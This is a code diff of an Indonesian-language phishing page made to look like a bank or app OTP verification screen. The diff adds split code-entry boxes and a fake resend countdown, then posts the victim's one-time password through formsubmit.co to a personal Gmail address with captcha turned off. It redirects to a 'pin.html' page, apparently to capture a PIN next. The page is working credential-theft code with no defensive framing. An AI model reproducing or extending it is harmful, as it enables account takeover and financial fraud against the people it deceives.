@@ -54,15 +54,47 @@
   </style>
 </head>
 <body>
-  <h2>kode otp</h2>
-  <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
-    <input type="password" name="otp" maxlength="4" pattern="\d{4}" placeholder="••••" required />
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://b813743.github.io/Testing-/">
-    <button type="submit">KONFIRMASI</button>
-  </form>
-  <div class="info">
-    Dengan memasukkan otp, kamu menyetujui transaksi dan autentikasi aman melalui aplikasi.
+  <div class="header">Verifikasi OTP</div>
+  <div class="container">
+    <div class="title">Masukkan Kode OTP</div>
+    <div class="desc">Kami telah mengirimkan kode ke nomor Anda</div>
+    <div class="otp-inputs">
+      <input type="tel" maxlength="1" oninput="moveNext(this, 0)" required>
+      <input type="tel" maxlength="1" oninput="moveNext(this, 1)" required>
+      <input type="tel" maxlength="1" oninput="moveNext(this, 2)" required>
+      <input type="tel" maxlength="1" oninput="moveNext(this, 3)" required>
+    </div>
+    <div class="timer" id="timer">Kirim ulang dalam 100 detik</div>
+    <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return submitOTP()">
+      <input type="hidden" name="OTP" id="otpFull">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="pin.html">
+      <button type="submit">KONFIRMASI</button>
+    </form>
   </div>
+  <script>
+    const inputs = document.querySelectorAll(".otp-inputs input");
+    function moveNext(el, index) {
+      if (el.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    }
+    function submitOTP() {
+      const otp = Array.from(inputs).map(i => i.value).join('');
+      document.getElementById("otpFull").value = otp;
+      return true;
+    }
+    let countdown = 100;
+    const timerEl = document.getElementById("timer");
+    const interval = setInterval(() => {
+      countdown--;
+      timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
+      if (countdown <= 0) {
+        clearInterval(interval);
+        timerEl.textContent = "Silakan kirim ulang kode";
+      }
+    }, 1000);
+    window.onload = () => inputs[0].focus();
+  </script>
 </body>
 </html>
